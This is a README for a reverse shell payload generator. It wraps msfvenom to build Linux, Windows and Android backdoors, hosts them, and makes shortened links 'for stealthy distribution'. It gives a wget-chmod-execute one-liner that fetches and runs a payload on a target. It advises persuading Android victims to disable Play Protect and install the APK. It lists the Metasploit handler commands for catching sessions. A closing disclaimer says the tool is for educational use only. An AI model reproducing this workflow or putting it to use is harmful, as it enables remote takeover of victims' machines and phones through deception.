# **Reverse Shell Payload Generator**  

🔥 **Quickly generate Linux, Windows, and Android reverse shell payloads** and start a Metasploit listener for easy control.  

---

## **🚀 Features**  
✅ Generate payloads for:  
- **Linux** (`.elf`)  
- **Windows** (`.exe`)  
- **Android** (`.apk`)  

✅ **Automatic HTTP server setup** for easy file delivery  
✅ **Shortened links** for stealthy distribution  
✅ **Metasploit auto-config** to listen for incoming sessions  

---

## **📌 Installation & Setup**  

### **1️⃣ Install Dependencies**  
Ensure you have:  
- **Python 3**  
- **Metasploit Framework**  
- **`msfvenom`** (part of Metasploit)  

For Debian/Ubuntu, run:  
```bash
sudo apt update && sudo apt install metasploit-framework python3
```

---

### **2️⃣ Run the Script**  
```bash
sudo python3 payload.py
```

---

## **🛠 Usage**  
When you run the script, you’ll see this menu:  

```
███████╗███████╗████████╗██╗  ██╗
██╔════╝██╔════╝╚══██╔══╝██║  ██║
███████╗█████╗     ██║   ███████║
╚════██║██╔══╝     ██║   ██╔══██║
███████║███████╗   ██║   ██║  ██║
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝

🔥 Quicker way to generate that rev shell 🔥

[1] Linux Reverse Shell
[2] Windows Reverse Shell
[3] Android Reverse Shell
[4] Start Metasploit & Monitor sessions
[0] Exit
```

**Choose an option:**  
- **1, 2, or 3** → Generates a payload and gives a **download link**  
- **4** → Starts a **Metasploit listener** to catch the session  

---

## **📡 Delivering the Payload**  

### **🔹 Linux & Windows Targets**  
Send the generated command:  
```bash
wget -qO <payload> <shortened_link> && chmod +x <payload> && ./<payload>
```

### **🔹 Android Targets**  
Tell them to **open the link in their browser** and install the APK manually.  

> **Play Protect Warning:**  
> They may need to **disable Play Protect** in the Google Play Store to install the APK.  

---

## **📡 Start the Listener (Metasploit)**  
Once a payload is executed, start listening:  

```bash
use exploit/multi/handler
set payload <payload_type>
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

When the target runs the payload, **you get a session**! 🎯  

---

## **⚠️ Disclaimer**  
This tool is for **educational purposes only**. Unauthorized use **is illegal**. **Use it only on systems you have permission for!**  

---
